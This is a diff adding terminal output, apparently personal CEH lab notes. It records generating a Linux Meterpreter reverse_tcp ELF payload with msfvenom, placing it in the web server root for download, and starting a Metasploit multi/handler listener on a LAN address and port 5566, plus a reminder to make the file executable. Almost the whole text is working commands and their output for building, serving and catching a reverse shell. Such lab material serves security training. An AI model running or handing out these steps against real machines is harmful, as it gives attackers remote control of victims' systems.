@@ -1,0 +1,31 @@
+root@root:~/Desktop/GIT/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.224 -f elf -o /var/www/html/testforkali.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+Saved as: /var/www/html/testforkali.elf
+root@root:~/Desktop/GIT/CEH# service postgreslq start
+Failed to start postgreslq.service: Unit postgreslq.service not found.
+root@root:~/Desktop/GIT/CEH# service postgresql start
+root@root:~/Desktop/GIT/CEH# msfconsole -q
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 192.168.0.224
+LHOST => 192.168.0.224
+msf5 exploit(multi/handler) > set LPORT 5566
+LPORT => 5566
+msf5 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.0.224:5566 
+msf5 exploit(multi/handler) > 
+
+
+
+
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Need to give permission :
+chmod +x filename
